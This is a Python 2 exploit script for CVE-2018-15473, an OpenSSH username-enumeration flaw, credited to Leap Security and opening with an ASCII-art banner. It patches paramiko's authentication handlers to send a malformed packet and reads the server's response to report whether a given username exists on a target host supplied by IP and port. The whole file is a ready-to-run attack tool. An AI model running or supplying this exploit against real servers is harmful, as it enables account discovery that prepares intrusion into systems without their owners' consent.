#!/usr/bin/env python2
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter
# -*- coding: utf-8 -*-
class colors:
    reset='\033[0m'
    red='\033[31m'
    green='\033[32m'
    orange='\033[33m'
    blue='\033[34m'
# ASCII Art at https://www.patorjk.com/software/taag/#p=display&f=Graffiti&t=Type Something%20
print(colors.blue + """
					   (°з°)                                    
			 ʕ•ᴥ•ʔ__ ʕ•ᴥ•ʔ__ __  \|_    ________ᵔᴥᵔ)  _ ▼.ᴥ.▼__ __   __ 
			|       |       |  | |  |  |       |  |  | |  | |  |  |_|  |
			8  _____8  _____8  |_|  |  |    ___|   |_| |  | |  |       |
			| |_____| |_____|       |  |   |___|       |  |_|  |       |
			|_____  |_____  |       |  |    ___|  _    |       |       |
			 _____| |_____| |   _   |  |   |___| | |   |       | ||_|| |
			|_______|_______|__| |__|  |_______|_|  |__|_______|_|   |_|

""" + "\n\t\t\t" + colors.blue + "author: " + colors.orange + "__LEAP Security__" "\n" + colors.reset)

import argparse, logging, paramiko, socket, sys, os

class InvalidUsername(Exception):
    pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

# call when username was invalid
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# perform authentication with malicious packet and username
def check_user(username):
    sock = socket.socket()
    sock.connect((args.target, args.port))
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] Failed to negotiate SSH transport')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print("[-] {} is an invalid username".format(username))
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        print("[+] {} is a valid username".format(username))

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('username', help="Username to check for validity.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

check_user(args.username)
